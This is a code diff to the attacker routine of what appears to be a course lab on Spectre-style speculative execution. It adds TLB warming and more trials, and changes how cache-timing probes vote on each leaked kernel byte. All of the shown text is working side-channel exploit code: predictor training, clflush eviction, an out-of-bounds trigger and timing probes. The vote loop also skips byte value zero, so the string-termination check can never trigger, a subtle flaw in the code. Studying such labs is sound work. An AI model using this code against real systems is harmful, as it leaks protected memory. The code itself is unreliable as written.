@@ -48,42 +48,55 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // [Part 3]- Fill this in!
         // leaked_byte = ??
         const uint64_t CACHE_HIT_THRESHOLD = 80;
-        const int NUM_TRIES           = 10;   // repeat each byte this many times
-        int histogram[256]            = {0};
+        const int    NUM_TRIES           = 100;
+        int          histogram[256]      = {0};
 
         for (int attempt = 0; attempt < NUM_TRIES; attempt++) {
-            /* (1) Train the branch predictor: 30× with an in‐bounds offset (0) */
+            /* (1) Train the branch predictor: 30× in‐bounds (offset=0) */
             for (int train = 0; train < 30; train++) {
                 call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
-            /* (2) Evict all 256 pages of the shared buffer from the cache */
+            /* (1.5) Warm the TLB for all 256 pages (forces page walks now) */
+            for (int i = 0; i < 256; i++) {
+                volatile char tmp = shared_memory[i * 4096];
+                (void)tmp;
+            }
+
+            /* (2) Evict all 256 pages from the cache */
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * 4096]);
             }
 
-            /* (3) Trigger one out‐of‐bounds access – will be mispredicted speculatively */
+            /* (3) One out‐of‐bounds call → speculative load of secret byte’s page */
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            /* (4) Reload+Reload: time‐probe each page and count any cache hits */
+            /* (4) Reload+Reload: find the single page with the lowest access time */
+            uint64_t best_time = UINT64_MAX;
+            int      best_idx  = -1;
             for (int i = 0; i < 256; i++) {
                 uint64_t t = time_access(&shared_memory[i * 4096]);
-                if (t < CACHE_HIT_THRESHOLD) {
-                    histogram[i]++;
+                if (t < best_time) {
+                    best_time = t;
+                    best_idx  = i;
                 }
+            }
+            /* Only count it if it actually looks like a cache hit */
+            if (best_idx >= 0 && best_time < CACHE_HIT_THRESHOLD) {
+                histogram[best_idx]++;
             }
         }
 
-        /* Pick the byte that “won” the vote */
-        int best_count = 0;
-        char leaked_byte = '?';   // fallback if we saw no hits at all
-        for (int i = 0; i < 256; i++) {
+        /* Vote: pick the byte value with the highest count */
+        int  best_count  = 0;
+        char leaked_byte = '?';
+        for (int i = 1; i < 256; i++) {
             if (histogram[i] > best_count) {
-                best_count = histogram[i];
+                best_count  = histogram[i];
                 leaked_byte = (char)i;
             }
         }
-        
+
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
